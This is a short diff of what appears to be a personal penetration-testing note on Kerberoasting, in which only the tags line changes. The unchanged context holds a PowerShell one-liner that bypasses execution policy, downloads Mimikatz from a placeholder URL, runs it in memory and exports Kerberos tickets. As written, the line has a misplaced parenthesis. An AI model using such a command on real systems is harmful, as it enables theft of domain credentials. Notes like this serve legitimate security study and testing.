@@ -31,4 +31,4 @@ The result of this step will be the hash of a kerberos ticket. It can directly b
 Whole Attack as oneliner:
 powershell.exe -exec bypass IEX (New-Object) Net.WebClient).DownloadString('<url to MimiKatz.ps1>'); Invoke-Mimikatz -Command "kerberos::list /export"
 
-tags: windows kerberos powershell Kerberoasting
+tags: #windows #kerberos #powershell #kerberoasting 
